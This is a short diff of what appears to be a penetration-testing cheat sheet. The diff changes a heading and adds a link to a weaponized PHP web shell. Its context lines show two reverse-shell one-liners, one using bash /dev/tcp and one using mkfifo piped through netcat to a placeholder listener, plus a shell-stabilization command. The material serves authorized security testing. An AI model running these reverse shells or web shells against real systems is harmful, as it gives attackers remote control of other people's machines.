@@ -102,8 +102,11 @@ bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f
 
-## Forward Shell
+# Forward Shell
 https://github.com/IppSec/forward-shell/blob/master/forward-shell.py
+
+# Weaponized Web Shell (PHP disabled function Bypass)
+https://github.com/epinna/weevely3
 
 # Linux Shell Stabilization
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
